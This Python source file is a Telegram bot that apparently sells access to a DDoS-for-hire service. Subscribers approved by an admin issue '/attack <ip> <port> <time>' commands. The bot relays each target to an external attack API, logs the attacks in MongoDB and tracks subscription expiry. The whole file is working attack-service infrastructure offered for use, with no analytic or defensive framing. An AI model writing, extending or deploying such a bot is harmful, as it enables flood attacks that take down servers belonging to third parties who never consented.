import asyncio
import logging
import re
import os
import uuid
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    filters
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "sastadev")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")

# Admin IDs handling
admin_raw = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(id.strip()) for id in admin_raw.split(",") if id.strip().isdigit()]

# Constraints
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# --- HELPERS ---
def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        if not MONGODB_URI:
            logger.error("MONGODB_URI is not set!")
            raise ValueError("MONGODB_URI environment variable is missing.")
            
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self._setup_db()

    def _setup_db(self):
        try:
            # Cleanup bad data
            self.users.delete_many({"user_id": {"$in": [None, ""]}})
            # Create Indexes
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            logger.info("✅ Database indexes verified.")
        except Exception as e:
            logger.error(f"❌ DB Setup Error: {e}")

    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user

    def create_user(self, user_id: int, username: str = None):
        if self.get_user(user_id): return
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        self.users.insert_one(user_data)

    def approve_user(self, user_id: int, days: int):
        expires_at = get_current_time() + timedelta(days=days)
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return expires_at

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "timestamp": get_current_time()
        }
        self.attacks.insert_one(attack_data)
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

# Initialize DB
db = Database()

# --- DECORATORS ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized.")
            return
        return await func(update, context)
    return wrapper

# --- API METHODS ---
def launch_attack_api(ip: str, port: int, duration: int):
    try:
        headers = {"x-api-key": API_KEY, "Content-Type": "application/json"}
        payload = {"ip": ip, "port": port, "duration": duration}
        response = requests.post(f"{API_URL}/api/v1/attack", json=payload, headers=headers, timeout=15)
        return response.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

# --- COMMAND HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db.create_user(user_id, update.effective_user.username)
    user = db.get_user(user_id)
    
    if user.get("approved"):
        await update.message.reply_text(f"✅ Active! Expires: {user.get('expires_at').strftime('%Y-%m-%d')}")
    else:
        await update.message.reply_text("❌ Not approved. Send your ID to Admin.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    
    if not user or not user.get("approved") or user.get("expires_at") < get_current_time():
        await update.message.reply_text("❌ No active subscription.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])

    if port in BLOCKED_PORTS:
        await update.message.reply_text("❌ Port blocked.")
        return

    msg = await update.message.reply_text("🚀 Launching...")
    res = launch_attack_api(ip, port, duration)

    if res.get("success"):
        db.log_attack(user_id, ip, port, duration, "success")
        await msg.edit_text(f"🎯 Attack Sent to {ip}:{port}!")
    else:
        db.log_attack(user_id, ip, port, duration, "failed")
        await msg.edit_text(f"❌ Failed: {res.get('error', 'API Error')}")

@admin_required
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: return
    target_id, days = int(context.args[0]), int(context.args[1])
    expiry = db.approve_user(target_id, days)
    await update.message.reply_text(f"✅ Approved {target_id} until {expiry}")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user: return
    txt = f"👤 User: {user['user_id']}\n✅ Approved: {user['approved']}\n🎯 Total: {user['total_attacks']}"
    await update.message.reply_text(txt)

# --- MAIN ---
def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN missing!")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("myinfo", myinfo))

    print("🚀 Bot Started on Railway!")
    app.run_polling()

if __name__ == "__main__":
    main()
